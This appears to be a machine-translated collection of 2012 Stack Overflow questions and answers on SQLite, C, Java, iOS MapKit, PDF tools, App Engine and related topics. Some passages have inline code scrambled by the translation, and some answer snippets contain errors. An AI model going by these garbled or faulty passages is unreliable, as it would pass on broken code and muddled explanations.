看看这个截图：我正沿着地图上的白色小路走，手机放在衬衫口袋里。每一秒，它都会在地图上放置一个图钉。您可以看到红色引脚偏离白色路径的严重程度。这是 30-50 英尺的偏离路径。对于一个 2 英尺长的机器人来说，这是一个大麻烦。如果它试图用这样的 GPS 分辨率纠正它的路径，它可能会变得非常混乱。 ![GPS实验](../Images/3c0ef76fda9de6fbbc2fa4a41331ae2c.png)

我在维基百科上看到了一个差分驱动方程（带有狭缝编码器的电机），计算在一定时间间隔内通过编码器的狭缝数量。这可能有助于纠正 GPS，但需要额外的硬件

# sqlite - UPDATE 语句中表名的 SQLite 别名

> ID：10772642
> 
> 赞同：9
> 
> 时间：2012-05-27T08:24:20.637
> 
> 标签：sqlite, alias

我有一个名为 Price 的 SQLite 表，如下所示：

```
date,     productId, price
----------------------
20120601, 10       , 10.1
20120601, 20       , 20.1
20120602, 10       , 0
20120602, 20       , 0
20120602, 30       , 0 
```

该表是使用以下语句创建的：

```
CREATE TABLE "Price" ("date" INTEGER NOT NULL , "productId" INTEGER NOT NULL , "price" DOUBLE, PRIMARY KEY ("date", "productId")) 
```

我想用上一个日期相同产品的价格填写date==20120602的价格。

即我希望表格变成这样：

```
date,     productId, price
----------------------
20120601, 10       , 10.1
20120601, 20       , 20.1
20120602, 10       , 10.1
20120602, 20       , 20.1
20120602, 30       , 0 
```

所以我尝试了这个 SQL 语句：

```
UPDATE Price New SET New.price = 
    (SELECT old.price FROM Price Old WHERE New.date == 2 AND Old.date == 1 AND New.productId == Old.productId) 
```

但是 SQLite 在点附近给了我一个错误。

比我试过这个说法：

```
UPDATE New Set New.Price = Old.Price
FROM Price New, Price Old
WHRER ...... 
```

SQLite 在 FROM 附近给了我一个错误。

我仔细检查了 SQLite 的 SQL 语法，但没有发现幸运。即使我从未尝试过，我认为这两个语句都可以在 MS SQL Server 中按预期工作。如果 New 和 Old 表太不同，第一个语句可能会起作用，但我需要它们在同一个表中。

我真的不想编写一个 for 循环来更新我的 C++ 代码中的一行，我需要有关在 SQLite 中实现此目的的正确方法的建议。

谢谢你。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-05-27T08:39:40.127

我自己也有过这种经历。只需在您使用change to`New`之后和任何地方删除单词即可。我确信有一个更好的解决方案，但它有效。`UPDATE Price``New.something``Price.something`

*使用评论中的代码片段更新...*

```
UPDATE Price 
SET
price = (SELECT old.price FROM Price Old WHERE Old.date = 1 AND price.productId = Old.productId) 
WHERE price.date = 2 
```

# c - 我不明白为什么这个简单的递归函数在 C 中不起作用

> ID：10772653
> 
> 赞同：1
> 
> 时间：2012-05-27T08:26:31.437
> 
> 标签：c

我正在尝试为我正在用 C 编写的更大的作业编写一个简单的函数。该函数的目的是确定字符串是否只包含小写或大写字母，并返回字符串的大小（\0 的索引）如果它通过了测试，如果没有通过，则为-1。这是我写的：

```
 #include <stdio.h>

int only_letters(char string[], int index);

void main() {
    char string1[]="Hi my name is pete";
    char string2[]="thisissupposedtobevalid";

    printf("the first string is %d and the second one is %d\n",only_letters(string1,0),only_letters(string2,0));

}

int only_letters(char string[], int index){
    if(!string[index]) return index;
    if(string[index]<'a'||string[index]>'Z') return -1;
    only_letters(string, index+1);
} 
```

当我运行它时，第一个字符串（应该是无效的）和第二个字符串都得到-1，这应该是有效的。

（我们不允许使用循环，我们还有十几个其他限制，所以请不要提供更简单或更简单的解决方案，我知道它们存在，但我试图理解为什么我写的东西不起作用。）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-27T08:29:15.003

请打开您的编译器警告，在默认情况下，您不会从该函数返回任何内容。

```
return only_letters(string, index+1); 
```

另一个问题是你的范围倒置了。大写字母的 ASCII 值低于小写字母。

并且`main`必须返回`int`。不是`void`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T08:40:54.703

这条线也有问题：

```
if(string[index]<'a'||string[index]>'Z') return -1; 
```

在 ASCII 表中，大写字母在前，然后是几个非字母符号，然后是小写字母。那条线应该看起来更像：

```
char l = string[index];
if(!((l >= 'A' && l <= 'Z') || (l >= 'a' && l <= 'z'))) return -1 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-27T08:28:38.970

在 ASCII 中，大写字母位于小写字母之前。第二个字符串的第一个字母是小写的“t”，ASCII 值为 116。另一方面，“Z”的 ASCII 值为 90，因此`'t' > 'Z'`

```
ASCII(Z) == 90
ASCII(a) == 97
ASCII(t) == 116 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-27T08:30:48.077

尝试：

```
return only_letters(string, index+1); 
```

# php - Wav 到 Ogg 或 PHP 中的 MP3

> ID：10772657
> 
> 赞同：2
> 
> 时间：2012-05-27T08:26:58.253
> 
> 标签：php, ffmpeg, wav, ogg

有没有使用纯 PHP 将 Wav 转换为 Ogg 或 MP3 的解决方案？从技术上讲是可能的。但是现成的库呢？

我说的是 1-7 秒 wav。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-27T08:34:43.010

用纯 PHP 编写这个肯定会融化你的大脑。也就是说，如果你知道足够多的 C 语言，你可以围绕 ffmpeg 创建一个 PHP 扩展包装器。这可能是最优化的。

或者，`exec()`除非您想分发代码并且讨厌将其作为（合理的）依赖项，否则您可以只使用它。

在这两种情况下，您都需要在服务器上安装一个有效的 ffmpeg 库。

**免责声明**

在写我自己的答案之前我没有读过[这个答案](https://stackoverflow.com/questions/5330486/how-to-convert-wav-to-mp3-file-in-php):)

# java - 如何使用泛型将相同的对象类型添加到 java Map

> ID：10772659
> 
> 赞同：0
> 
> 时间：2012-05-27T08:27:12.803
> 
> 标签：java, generics

我有两个对象如下

```
public class MyObject1 implements Serializable
{

private Long id;
... other properties and getters and setters
}

public class MyObject2 extends MyObject1
{
private String name;
...other properties and getters and setters
}

MyObject1 obj1 = new MyObject1();
MyObject2 obj2 = new MyObject2(); 
```

如何使用泛型在 HashMap 中添加这两个实例？

**更新**

我希望能够在同一张地图中添加 MyObject1 和 MyObject2。像

```
Map<Long, ? extends MyObject1> map; 
```

这样我就可以做到

```
map.put(obj1);
map.put(obj2); 
```

希望现在更清楚了。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-27T08:47:22.347

您可以直接使用`Map<Long, MyObject1>`：

```
Map<Long, MyObject1> map = new HashMap<Long, MyObject1>();
map.put(1l, new MyObject1());
map.put(2l, new MyObject2()); 
```

笔记：

`? extends MyObject1`是通配符。它代表“某种未知类型，我们唯一知道的是它是 Object 的子类型”。在声明中很好，但你不能实例化它，因为它不是一个实际的类型。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T08:38:14.630

让我们假设 id 是关键。它会是这样的：

```
Map<Long, MyObject1> map = new HashMap<Long, MyObject1>();
map.add(obj1.getId(), obj1);
map.add(obj2.getId(), obj2); 
```

# google-bigquery - 我如何获得用于 bigquery 使用的最终用户 api 密钥

> ID：10772669
> 
> 赞同：2
> 
> 时间：2012-05-27T08:28:54.313
> 
> 标签：google-bigquery

如果我必须在大查询 api 之上构建一个 android 应用程序，那么我希望最终用户提供他们自己的 api 密钥，因为他们将按使用量计费。我怎样才能做到这一点？可以在设置中向用户询问 api 密钥并将其存储在客户端吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-04T16:49:31.287

BigQuery 根据用户的使用情况（数据存储和数据分析）向用户收费，但不对应用程序的 API 调用收费。因此，您应该为所有用户使用自己的 API 密钥。

您的应用很可能需要询问用户他们想使用哪个项目来存储数据和/或运行作业。该项目 ID 将用于向用户收取使用费用，因此只要该项目 ID 归用户所有，您应该没问题。（顺便说一句，bigquery.projects.list 方法可用于检索用户可用的项目列表，以便您可以帮助他们选择与 BigQuery 一起使用的项目。如果他们还没有任何项目，他们需要在[http://code.google.com/apis/console](http://code.google.com/apis/console)创建一个。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T23:11:11.160

没有特定的最终用户 API 密钥。所有 API 密钥均从位于[https://code.google.com/apis/console/](https://code.google.com/apis/console/)的 API 控制台获取。 只要您了解该接口确实是为开发人员设计的，就可以要求最终用户提供自己的密钥。您可能需要提供特定于您的应用程序的分步说明。

出于好奇 - 您正在构建的应用程序是什么？

# javascript - How do I create a sparse array in javascript through iteration?

> ID：10772674
> 
> 赞同：1
> 
> 时间：2012-05-27T08:29:29.790
> 
> 标签：javascript, jquery, multidimensional-array, sparse-matrix

I wrote this code to scrape a sparse array from a series of dom elements. when done in one dimension the code works but in 2 dimensions it fails. Is there something i'm missing?

```
23         function initCellHover(){
24                 $cells.each(function(){
25                         var arrayX = $(this).position().left/cellWidth;
26                         var arrayY = $(this).position().top/cellHeight;
27                         var arrayValue = $(this);
28                         cellLookup[arrayX][arrayY] = arrayValue;
29                 });     
30         } 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-27T08:33:29.300

In line 28 you may be referring to a property of undefined. It makes sense to check, if there already is a property in the array and add it, if needed:

```
cellLookup[arrayX] = cellLookup[arrayX] || [];
cellLookup[arrayX][arrayY] = arrayValue; 
```

# pdf - pdftk 和 qpdf 重置 PDF 评论安全性

> ID：10772686
> 
> 赞同：20
> 
> 时间：2012-05-27T08:32:34.093
> 
> 标签：pdf, pdftk

为了能够在 linux 中为 pdf 文件添加注释，我必须重置 pdf 文档中的“评论”安全设置。

`qpdf --decrypt input.pdf output.pdf`应该删除任何密码或“加密”（[根据这篇文章](https://superuser.com/questions/216616/does-pdftk-respect-pdf-security-flags)）

`pdftk input input.pdf output output.pdf allow AllFeatures`应将所有文件证券（包括“评论”）设置为允许

应用这两个命令后，在 acroread 中我仍然可以看到（文件-> 文档-> 安全选项卡）不允许评论。

如何重置此安全属性？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-05-27T11:20:21.550

该命令`qpdf --decrypt input.pdf output.pdf`删除“所有者”密码。但它只有在没有设置“用户”密码的情况下才有效。

删除所有者密码后，`output.pdf`应该已经取消设置*所有*安全保护并允许评论。然后无需运行您的额外`pdftk ...`命令......顺便说一句，您调用中的`allow`参数`pdftk`将无法按照您引用命令的方式工作。`allow`仅当您还...

*   ...要么指定加密强度
*   ...或给用户或所有者密码

请尝试以下操作以找出文件的详细安全设置：

```
qpdf --show-encryption input.pdf
qpdf --show-encryption output.pdf 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-06-11T06:57:11.027

这个问题很常见，答案很简单。不要使用 acroread 检查文档的安全设置。qpdf 正确地删除了限制，但 acroread 不知道这一点。

Acroread 受到 Adob​​e 的有意限制，因此它不会与 Acrobat 竞争。（例如，您可以输入表单，但不能保存文档）。

# xsd - 无法使用 SVCUTIL 使用数据合同创建“ShareLibrary”

> ID：10772693
> 
> 赞同：2
> 
> 时间：2012-05-27T08:34:08.393
> 
> 标签：xsd, datacontractserializer, datacontract, xmlserializer, svcutil.exe

**案例：我有一组 xsd 文件，它们定义了 WSDL 定义中使用的常见类型（Header、ApplicationError）。每个 web 服务在服务特定类型旁边输入一个或多个这些共享类型。**

在为服务生成代理时，我不断地为每个服务代理获取这些共享类型的副本，因此我打算将它们放在共享库中并使用 /reference 来包含这些类型。我无法让它工作。

首先，生成代理并包含所有 *.xsd 工作正常，并生成合同。然后使用带有 /dconly 参数的每个 xsd 的 svcutil 不起作用。/XmlSerializer 都作为 /DataContractSerializer。只有 /importXmlType（或 xsd.exe）有效。

然后，如果我将它们放在一个类项目中，添加生成的代码，编译并将其用于 /reference 参数，我仍然会为这些类型生成代码。

即使我使用为代理生成的类，svcutil 仍然无法识别它们。

任何人都有这种模式的经验，也许遇到过同样的问题？

> XmlSerializer 作为 DataContractSerializer svcutil /dconly /ser:XmlSerializer ApplicieFout-v0200-b03.xsd 的错误消息
> 
> 错误：无法导入命名空间“http://schemas.customer.nl/ApplicatieFout-v0200”中的“ApplicatieFout”。元素“FoutCode”上的表单必须是合格的。要么更改架构，以便类型可以映射到数据协定类型，要么使用 ImportXmlType 或使用不同的序列化程序。
> 
> 如果您使用 /dataContractOnly 选项导入数据合同类型并收到此错误消息，请考虑改用 xsd.exe。在您的服务合同上应用 XmlSerializerFormatAttribute 属性后，可以在 Windows Communication Foundation 中使用由 xsd.exe 生成的类型。或者，考虑使用 /importXmlTypes 选项将这些类型导入为 XML 类型，以便与服务合同上的 DataContractFormatAttribute 属性一起使用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T13:36:30.837

在我们的支持活动中，我们经常看到像您这样的请求，足以说明一种模式。在没有看到实际的 XSD 和 WSDL 的情况下，（任何人）都很难说您是否遇到了产品错误或其他问题。

然而，多年来我学到的是，处理 XSD 到代码绑定的一般工具总是有限的。要解决这些限制，解决方案是从仔细规划 XSD 内容以及 WSDL 必须如何使用该内容开始。如果我控制生成 WSDL 和 XSD 的过程会更容易；当我“继承”或“采用”他人的时，我会应用自己的重构。

在 .NET 上，我对您的情况的解决方案是使用基于 WSDL 对组件化创作的规范支持的小技巧。假设您有两个服务的 WSDL，`Abc`并且`Xyz`. 我像这样构建一个“包装器”WSDL：

```
<?xml version="1.0" encoding="utf-8"?>
<wsdl:definitions xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/" 
    targetNamespace="http://services.paschidev.com/wrapper/usecase_a/1/" 
    xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/">
  <wsdl:import namespace="http://services.paschidev.com/service_abc/1/" location="AbcService.wsdl" />
  <wsdl:import namespace="http://services.paschidev.com/service_xyz/1/" location="XyzService.wsdl" />
  <wsdl:types />
</wsdl:definitions> 
```

通过您的实用程序提供此内容（使用 Visual Studio 2010 成功测试，***添加服务引用***命令），您就完成了。

细则...为了使所有这些都以高成功率工作，您希望组合的所有 WSDL 都**必须**遵循以下规则：通用 XSD 必须来自通用源。

如果服务`Abc`需要`{urn:paschidev-com:xsd:common:1}something`和`Xyz`需要相同，则 a`{urn:paschidev-com:xsd:common:1}something`必须来自两个 WSDL 的相同源 URI。

测试对我来说相当简单：我使用[QTAssistant](http://paschidev.com)的（我与它相关联）通过将其指向**包装器**WSDL来***提取 XSDs命令。***出现提示时，我让它创建一个 XSR 项目；如果从生成的 XSD 创建的集合编译良好，则意味着没有重复的 XSD 定义。如果编译给出“已经定义”的错误，报告会告诉我哪个 XSD 组件是重复的，即来自两个或多个不同的源 Uris。我重构每个组件以保留一个源 uri；然后再试一次。

 **有时，即使我得到了正确的 XSD，svcutil 或 xsd 仍可能会阻塞；如果发生这种情况，那就是与包装无关的东西；即使没有这个包装器，它也会表现出来。这意味着确保在进行任何重构之前，每个单独的 WSDL 都可以单独运行良好，这始终是一个好主意。**

# iphone - 多选图像选择器

> ID：10772695
> 
> 赞同：2
> 
> 时间：2012-05-27T08:34:37.113
> 
> 标签：iphone, ios, image, uiimagepickercontroller

我需要一个支持多种选择来编写应用程序的图像选择器，例如照片。

我通过搜索找到了一些解决方案，问题是，选择最好的一个。我认为最好请教一些专家。

解决方案列表：

1.  使用`ALAssetsLibrary`. 问题：据我阅读，它读取用户的地理位置并请求许可，这是我不想要的。
2.  [使用苹果 API](https://stackoverflow.com/questions/9542487/select-multiple-images-from-photo-library)
3.  使用`ELCImagePickerController`. 问题：我读到当有超过 100 张照片时它会崩溃。
4.  使用`AGImagePickerController`. 问题：新版本（2012 年 3 月 12 日）、缺乏足够的评论以及可能存在未知问题。

你同意这些问题吗？还有其他解决方案吗？以上哪个是最好用的？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T08:52:05.200

是的资产库将为您提供所有地理位置信息

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-22T09:50:50.870

这应该工作 [https://stackoverflow.com/a/9558307/1294448](https://stackoverflow.com/a/9558307/1294448)

诀窍是在选择每个图像`dismiss`之后`didFinishPickingImage`和之后不要选择器。`writeToFile`

```
-(void)imagePickerController:(UIImagePickerController *)picker
      didFinishPickingImage : (UIImage *)image
                 editingInfo:(NSDictionary *)editingInfo
{
.
.
.
// Get the data for the image
        NSData* imageData = UIImageJPEGRepresentation(image, 1.0);
.
.
.
// and then we write it out
        [imageData writeToFile:fullPathToFile2 atomically:NO];
} 
```

关于位置：资产库为您提供所有地理位置信息，因此应用程序将收到提示，说明应用程序正在尝试访问其位置。还没有解决这个问题。

# bluetooth - 如何知道蓝牙加密狗是否支持 WinXP SP3 中的串行端口配置文件 (SPP)？

> ID：10772700
> 
> 赞同：3
> 
> 时间：2012-05-27T08:35:50.420
> 
> 标签：bluetooth, spp

我在 WinXP SP3 环境中使用 USB 蓝牙加密狗。我假设蓝牙加密狗被默认蓝牙堆栈识别（蓝牙图标出现在右下角）。

我想知道如何列出蓝牙加密狗（或 WinXP 蓝牙堆栈）支持的服务？我怎么知道是否支持串行端口配置文件 (SPP)？

此外，由于我对蓝牙协议不是很熟悉，我想知道 SPP 服务是 WinXP 蓝牙协议栈支持的功能吗？还是蓝牙加密狗中的固件支持的功能？（即使用相同的蓝牙加密狗，此 SPP 服务可能会在我使用某个蓝牙堆栈时出现，而在我使用另一个蓝牙堆栈时可能会消失。）

感谢您的任何指示或建议。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-27T12:47:42.723

想想蓝牙加密狗与堆栈之类的互联网案例。蓝牙加密狗是以太网卡，蓝牙堆栈是 Windows 实现的所有内容，例如对 TCP/IP 的支持，然后是各种应用程序对各种互联网协议/应用程序的支持。

所以 SPP 支持由堆栈处理，而不是加密狗——加密狗只处理发送数据包等。

SPP 可以通过 API 和大多数蓝牙堆栈上的虚拟 COM 端口访问。MSFT 堆栈当然支持两者。请参阅“蓝牙设置”控制面板上的“COM 端口”选项卡。如果配对设备没有自动设置 COM 端口，那么您可以在那里手动进行。

[![](../Images/0fa8228489f36e23ffa74b4f9ab286fd.png)](https://i.stack.imgur.com/9KAQm.png)
[（来源：[alanjmcf.me.uk](http://www.alanjmcf.me.uk/TEMP/bth-cpl-comX.png)）]

* * *

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-01-18T08:59:52.200

请尝试以下步骤：

1.  调出服务控制台（开始菜单 -> 运行 -> services.msc）
2.  找到“蓝牙支持服务”</li>
3.  右键单击服务并选择“属性”</li>
4.  如果选中“此帐户”单选按钮，那就是问题所在。
5.  改为检查“本地系统帐户”单选按钮
6.  点击“确定”</li>
7.  再次右键单击列表中的服务，这次选择“重启”</li>

# ios - 如何根据字符串值显示不同的注释图像

> ID：10772701
> 
> 赞同：0
> 
> 时间：2012-05-27T08:35:55.357
> 
> 标签：ios, xcode, image, annotations, plist

我有一个带有多个注释的 MapView。我需要根据 data.plist 中的字符串值将不同的图像添加到注释中

我当前的代码（仅适用于一个类别，一张图片）：

```
NSString *path = [[NSBundle mainBundle] pathForResource:@"data" ofType:@"plist"];
    NSDictionary *dict = [NSDictionary dictionaryWithContentsOfFile:path];

    NSArray *anns = [dict objectForKey:@"Category1"];
    pinView.image = [UIImage imageNamed:[[anns objectAtIndex:0] objectForKey:@"Icon"]];

    pinView.canShowCallout=YES; 
```

我的 plist 文件构造：

![列表](../Images/6712a4aba6d834cd688fa6fa1b6af3ac.png)

**编辑**

我的 MapViewController.m

```
- (void)viewDidLoad
{
    [super viewDidLoad];

    NSMutableArray *annotations = [[NSMutableArray alloc]init];

    NSString *path = [[NSBundle mainBundle] pathForResource:@"data" ofType:@"plist"];
    NSDictionary *dict = [NSDictionary dictionaryWithContentsOfFile:path];

    NSArray *anns = [dict objectForKey:@"Category1"];

    NSLog(@" MapView is %@",mapView);
    NSLog(@"anns is: %@", anns);

    for(int i = 0; i < [anns count]; i++) {

        NSString *coordinates = [[anns objectAtIndex:i] objectForKey:@"Coordinates"];

        double realLatitude = [[[coordinates componentsSeparatedByString:@","] objectAtIndex:1] doubleValue];
        double realLongitude = [[[coordinates componentsSeparatedByString:@","] objectAtIndex:0] doubleValue];

        MyAnnotation *myAnnotation = [[MyAnnotation alloc] init];
        CLLocationCoordinate2D theCoordinate;
        theCoordinate.latitude = realLatitude;
        theCoordinate.longitude = realLongitude;

        //calculate distance
        CLLocationCoordinate2D annocoord = myAnnotation.coordinate;
        CLLocationCoordinate2D usercoord = self.mapView.userLocation.coordinate;

        NSLog(@"ANNO  = %f, %f", annocoord.latitude, annocoord.longitude);
        NSLog(@"USER = %f, %f", usercoord.latitude, usercoord.longitude);

        CLLocation *loc = [[CLLocation alloc] initWithLatitude:myAnnotation.coordinate.latitude longitude:myAnnotation.coordinate.longitude];
        CLLocation *loc2 = [[CLLocation alloc] initWithLatitude:self.mapView.userLocation.coordinate.latitude longitude:self.mapView.userLocation.coordinate.longitude];

        NSLog(@"LOC  = %f, %f", loc.coordinate.latitude,  loc.coordinate.longitude);
        NSLog(@"LOC2 = %f, %f", loc2.coordinate.latitude, loc2.coordinate.longitude);

        CLLocationDistance dist = [loc distanceFromLocation:loc2];

        NSLog(@"DIST: %f", dist); 

        myAnnotation.coordinate=CLLocationCoordinate2DMake(realLatitude,realLongitude);        
        myAnnotation.title = [[anns objectAtIndex:i] objectForKey:@"Name"];
        myAnnotation.subtitle = [NSString stringWithFormat:@"%.f", dist];

        [mapView addAnnotation:myAnnotation];
        [annotations addObject:myAnnotation];
    }

    NSArray *alko = [dict objectForKey:@"Category2"];

    NSLog(@" MapView is %@",mapView);
    NSLog(@"alko is: %@", alko);

    for(int i = 0; i < [alko count]; i++) {

        NSString *coordinates = [[alko objectAtIndex:i] objectForKey:@"Coordinates"];

        double realLatitude = [[[coordinates componentsSeparatedByString:@","] objectAtIndex:1] doubleValue];
        double realLongitude = [[[coordinates componentsSeparatedByString:@","] objectAtIndex:0] doubleValue];

        MyAnnotation *myAnnotation = [[MyAnnotation alloc] init];
        CLLocationCoordinate2D theCoordinate;
        theCoordinate.latitude = realLatitude;
        theCoordinate.longitude = realLongitude;

        myAnnotation.coordinate=CLLocationCoordinate2DMake(realLatitude,realLongitude);        
        myAnnotation.title = [[alko objectAtIndex:i] objectForKey:@"Name"];
        myAnnotation.subtitle = [[alko objectAtIndex:i] objectForKey:@"Address"];

        [mapView addAnnotation:myAnnotation];
        [annotations addObject:myAnnotation];
    }

    self.locationManager = [[CLLocationManager alloc] init];
    self.locationManager.delegate = self;
    self.locationManager.desiredAccuracy = kCLLocationAccuracyBest;
    [self.locationManager startUpdatingLocation];

} 
```

注解

```
- (MKAnnotationView *)mapView:(MKMapView *)mapView viewForAnnotation:(id <MKAnnotation>)annotation
{

    if ([annotation isKindOfClass:[MKUserLocation class]])
        return nil;

    static NSString* AnnotationIdentifier = @"AnnotationIdentifier";
    MKPinAnnotationView* pinView = [[MKPinAnnotationView alloc]
                                    initWithAnnotation:annotation reuseIdentifier:AnnotationIdentifier];

    NSString *path = [[NSBundle mainBundle] pathForResource:@"data" ofType:@"plist"];
    NSDictionary *dict = [NSDictionary dictionaryWithContentsOfFile:path];

    NSArray *anns = [dict objectForKey:@"Category1"];
    pinView.image = [UIImage imageNamed:[[anns objectAtIndex:0] objectForKey:@"Icon"]];

    pinView.canShowCallout=YES;

    return pinView;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T09:29:52.973

这是你需要的吗？

```
NSString *theCategory;

// set theCategory to what you need.
theCategory = @"Category1"

NSArray *anns = [dict objectForKey:theCategory]; 
```

**编辑 1**

首先，您最好将注释类设置如下：

**MyAnnotation.h**

```
#import <MapKit/MapKit.h>

@interface MyAnnotation : NSManagedObject <MKAnnotation>{

CLLocationCoordinate2D coordinate;
UIImage *imageForMyAnnotation;
}

@property (nonatomic,readwrite) CLLocationCoordinate2D coordinate;
@property (nonatomic, retain) UIImage *imageForMyAnnotation; 
```

**我的注释.m**

```
#import "MyAnnotation.h"

@implementation MyAnnotation

- (CLLocationCoordinate2D)coordinate
{
//here you can set the coordinate of your annotation
return coordinate;
}

- (UIImage *)imageForMyAnnotation{
//set the image here, i think it is depend on the coordinate right? You can put some code here to chose the category that corresponding to the coordinate
return image;
}

// optional
- (NSString *)title
{
return title;
}
- (NSString *)subtitle
{
return subtitle;
} 
```

然后在你的mapView中，你可以添加注释

**地图视图.m**

```
[self.mapView addAnnotations:myAnnotationArray]; 
```

或者

```
[self.mapView addAnnotation:myAnnotation]; 
```

和

```
- (MKAnnotationView *)mapView:(MKMapView *)theMapView viewForAnnotation:(id <MKAnnotation>)annotation{

UIImageView *annotationImageView = [[UIImageView alloc] initWithImage: myAnnotation.imageForMyAnnotatioin]; 

customPinView.leftCalloutAccessoryView = annotationImageView;

} 
```

# google-app-engine - 将文件上传到 Google App Engine Blobstore（和 High Replication Datastore）时出现恒定的 HTTP 503 错误

> ID：10772709
> 
> 赞同：0
> 
> 时间：2012-05-27T08:37:32.700
> 
> 标签：google-app-engine, blobstore

我有一个将文件上传到 Google App Engine 的应用程序。大多数计算机上的上传工作正常，但在一个系统（在不同的地理位置）上，我们在上传文件时不断收到 HTTP 503 错误。

该应用程序遵循 App Engine 文档。我们首先使用 BlobstoreService.createUploadUrl 创建上传 URL，将 URL 返回给客户端，然后客户端将文件提交到该 URL。

503错误的原因是什么以及如何解决？奇怪的是，它在该系统上不断复制，而同一个应用程序成功地从其他系统上传文件。

在下面的日志中，您可以看到： 1\. 上传 URL 的请求/响应的 HTTP 标头， 2\. 返回的上传 URL 3\. 对该上传 URL 的请求/响应的 HTTP 标头。

```
GET /upload-url HTTP/1.1
Host: cl-test-grid.appspot.com
User-Agent: Drakma/1.2.6 (SBCL 1.0.57; Darwin; 10.8.0; http://weitz.de/drakma/)
Accept: */*
Connection: close

HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Vary: Accept-Encoding
Date: Sun, 27 May 2012 05:30:03 GMT
Server: Google Frontend
Cache-Control: private
Connection: close

2012-05-27 05:30:02 upload-url: http://cl-test-grid.appspot.com/_ah/upload/AMmfu6b0LpFQeYiI5sZa6KcBy9_JpIreCEjYY-FEbd3b8wPApdW3_rUIETK-geaaw_x5xq3QHhcn_wd2Pykos07xIRJTZesBIX0jkI3L4-Ri3TiOqnbS3iM/ALBNUaYAAAAAT8G-M8FF5sO4mMkXVzZX8hTcUv0OQlIK/

POST /_ah/upload/AMmfu6b0LpFQeYiI5sZa6KcBy9_JpIreCEjYY-FEbd3b8wPApdW3_rUIETK-geaaw_x5xq3QHhcn_wd2Pykos07xIRJTZesBIX0jkI3L4-Ri3TiOqnbS3iM/ALBNUaYAAAAAT8G-M8FF5sO4mMkXVzZX8hTcUv0OQlIK/ HTTP/1.1
Host: cl-test-grid.appspot.com
User-Agent: Drakma/1.2.6 (SBCL 1.0.57; Darwin; 10.8.0; http://weitz.de/drakma/)
Accept: */*
Connection: close
Content-Type: multipart/form-data; boundary=----------6mlF09BtSz1OnI06GN22cqE9jBOi8L2ozKYqrT7fQy8dDDhwk2
Content-Length: 342917

HTTP/1.1 503 Service Unavailable
Server: HTTP Upload Server Built on May 23 2012 15:51:04 (1337813464)
Date: Sun, 27 May 2012 05:30:15 GMT
Pragma: no-cache
Expires: Fri, 01 Jan 1990 00:00:00 GMT
Cache-Control: no-cache, no-store, must-revalidate
Content-Length: 0
Content-Type: text/html
Connection: close 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-31T23:00:38.170

在 blobstore 上传期间，我们也看到了很多 503 错误。这来自客户系统以及内部系统。由于它直到最近都运行良好，并且我们没有更改任何相关代码，我只能假设 Google 端存在问题。

我在问题跟踪器上找不到 Stefano 的报告，所以我记录了一个新问题，编号 7619：

[http://code.google.com/p/googleappengine/issues/detail?id=7619](http://code.google.com/p/googleappengine/issues/detail?id=7619)

如果您仍然遇到此问题，请对此加注星标，以鼓励 Google 对其进行调查并修复它或就如何检测和解决该错误提供建议。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-30T04:29:50.187

我公司最近几天也遇到了类似的问题

我认为 Google 的 blobstore 服务器存在问题

根据您被重定向到的服务器，上传可能会或可能不会失败

我刚刚报告了一个生产问题

# entity-framework - 实体框架 SaveChanges 不保存数据

> ID：10772713
> 
> 赞同：3
> 
> 时间：2012-05-27T08:37:48.980
> 
> 标签：entity-framework, sqlite, sql-server-ce

```
using (var db = new dbEntities())
{
    var dbUser = (from u in db.Users
                  where u.Id == Id
                  select u).First();

    dbUser.LastName = LastName;
    dbUser.FirstName = FirstName;
    dbUser.GroupId  = GroupId;
    dbUser.VoicesCount = VoicesCount;

    db.SaveChanges();
 } 
```

这不会保存对数据库的任何更改。但也不例外。为什么？

UPD：好的，我也为 SQL Server CE 尝试过，没有任何变化。它不会保存更改的数据。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-05-27T12:19:10.550

在您的 bin/debug 文件夹中查找数据库的副本，它将具有更改的数据，因为您将数据库包含在您的应用程序中

# ios - 当我开始翻转时，如何在页面视图中捕捉手势？

> ID：10772720
> 
> 赞同：1
> 
> 时间：2012-05-27T08:38:33.330
> 
> 标签：ios, ipad

在页面视图中，当您将页面翻到翻页序列的中间并且不释放时。[**参见图片**](http://i.stack.imgur.com/RnYSD.png)，当我释放时，我可以通过以下委托方法捕获完成手势：

```
- (void)pageViewController:(UIPageViewController *)pageViewController didFinishAnimating:(BOOL)finished previousViewControllers:(NSArray
*)previousViewControllers transitionCompleted:(BOOL)completed 
```

但是，如何在分页动画开始时捕获手势事件？

非常感谢！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-11-12T10:57:48.390

查看

`-(void)pageViewController:(UIPageViewController *)pageViewController willTransitionToViewControllers:(NSArray *)pendingViewControllers`

UIPageViewControllerDelegate 的方法

# c# - C# 中的 Exception 或 Either monad

> ID：10772727
> 
> 赞同：17
> 
> 时间：2012-05-27T08:40:37.163
> 
> 标签：c#, monads

我在尝试着~~格罗克~~初步了解单子。

